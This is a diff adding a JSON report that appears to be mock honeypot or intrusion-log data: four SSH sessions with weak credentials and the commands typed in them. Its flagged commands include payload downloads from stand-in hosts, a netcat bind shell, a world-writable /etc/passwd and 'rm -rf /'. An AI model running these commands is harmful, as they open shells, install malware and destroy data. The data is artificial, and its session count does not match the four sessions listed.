@@ -1,0 +1,122 @@
+{
+  "metadata": {
+    "report_date": "20250601T02:57:20.436835",
+    "analysis_period": {
+      "start": "2025-06-01T00:00:00+00:00",
+      "end": "2025-06-01T23:59:59+00:00"
+    }
+  },
+  "statistics": {
+    "total_sessions": 3,
+    "unique_ips": 4
+  },
+  "top_ips": [
+    {
+      "ip": "208.67.220.220",
+      "count": 1
+    },
+    {
+      "ip": "1.1.1.1",
+      "count": 1
+    },
+    {
+      "ip": "9.9.9.9",
+      "count": 1
+    },
+    {
+      "ip": "203.0.113.1",
+      "count": 1
+    }
+  ],
+  "dangerous_commands": [
+    {
+      "command": "curl -O http://evil.com/miner",
+      "count": 2
+    },
+    {
+      "command": "nc -l -p 4444 -e /bin/bash",
+      "count": 3
+    }
+  ],
+  "session_details": {
+    "mock00000000": {
+      "ip": "208.67.220.220",
+      "timestamp": "2025-06-01T21:24:33.000000Z",
+      "login": {
+        "username": "oracle",
+        "password": "qwerty",
+        "status": "failed"
+      },
+      "commands": [
+        "ps",
+        "top",
+        "ps",
+        "ls",
+        "uname -a",
+        "ls",
+        "chmod 777 /etc/passwd"
+      ],
+      "dangerous_commands": [
+        "chmod 777 /etc/passwd"
+      ],
+      "downloads": [
+        {
+          "url": "http://malicious-site1.com/malware.sh",
+          "filename": "malware92.sh"
+        }
+      ]
+    },
+    "mock00000001": {
+      "ip": "1.1.1.1",
+      "timestamp": "2025-06-01T22:31:15.000000Z",
+      "login": {
+        "username": "centos",
+        "password": "password123",
+        "status": "success"
+      },
+      "commands": [
+        "df",
+        "uptime"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    },
+    "mock00000002": {
+      "ip": "9.9.9.9",
+      "timestamp": "2025-06-01T10:57:56.000000Z",
+      "login": {
+        "username": "oracle",
+        "password": "admin",
+        "status": "success"
+      },
+      "commands": [
+        "id",
+        "wget http://malware.com/bot.sh",
+        "python -c \"import os; os.system('rm -rf /')\""
+      ],
+      "dangerous_commands": [
+        "wget http://malware.com/bot.sh",
+        "python -c \"import os; os.system('rm -rf /')\""
+      ],
+      "downloads": []
+    },
+    "mock00000003": {
+      "ip": "203.0.113.1",
+      "timestamp": "2025-06-01T01:07:33.000000Z",
+      "login": {
+        "username": "admin",
+        "password": "admin",
+        "status": "success"
+      },
+      "commands": [
+        "free",
+        "top",
+        "id",
+        "ps",
+        "pwd"
+      ],
+      "dangerous_commands": [],
+      "downloads": []
+    }
+  }
+}
